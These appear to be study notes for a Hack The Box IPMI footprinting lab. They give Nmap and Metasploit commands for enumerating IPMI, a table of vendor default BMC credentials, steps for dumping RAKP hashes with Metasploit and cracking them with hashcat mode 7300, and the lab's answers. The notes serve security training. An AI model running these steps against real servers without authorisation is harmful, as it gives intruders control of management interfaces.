
## Basics

- IPMI is a standardized, hardware-based host management system operating independently of BIOS/CPU/OS.
    
- Used to manage/monitor systems even when powered off or unresponsive; supports remote upgrades.
    
- Typical uses:
    
    - Before OS boot to modify BIOS
        
    - When host is powered down
        
    - After a system failure
        
- Monitors temperature, voltage, fans, power supplies; supports inventory queries, hardware logs, SNMP alerts.
    
- Requires power source and LAN; supported by many vendors; IPMI 2.0 supports serial over LAN.
    
- Components: BMC, ICMB, IPMB, IPMI Memory, Communications Interfaces.
    

---

## Footprinting the Service

### Nmap

```bash
sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
```

Example output:

```
623/udp open  asf-rmcp
| ipmi-version:
|   Version:
|     IPMI-2.0
|   UserAuth:
|   PassAuth: auth_user, non_null_user
|_  Level: 2.0
```

### Metasploit

```bash
use auxiliary/scanner/ipmi/ipmi_version 
set rhosts 10.129.42.195
run
```

Example output:

```
[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0)
```

Default credentials (examples):

|Product|Username|Password|
|---|---|---|
|Dell iDRAC|root|calvin|
|HP iLO|Administrator|randomized 8-character string (numbers and uppercase letters)|
|Supermicro IPMI|ADMIN|ADMIN|

---

## Hashcat

- IPMI 2.0 RAKP flaw: server sends salted SHA1/MD5 of user’s password pre-auth.
    
- Crack with Hashcat mode 7300.
    
- HP iLO factory default mask example:
    
    ```
    hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
    ```
    

---

## Metasploit – Dumping Password

```bash
use auxiliary/scanner/ipmi/ipmi_dumphashes 
set rhosts 10.129.42.195
show options
run
```

Example output:

```
[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:...:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
```

---

## HTB – Guide

### Question 1

- Module: `auxiliary/scanner/ipmi/ipmi_dumphashes`
    

```bash
msfconsole -q
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS STMIP
run
```

Example output shows username `admin`.

### Question 2

- Crack with Hashcat mode 7300 and `rockyou.txt`:
    

```bash
hashcat -m 7300 -w 3 -O "93c8...:3541..." /usr/share/wordlists/rockyou.txt
```

Example output reveals plaintext password `trinity`.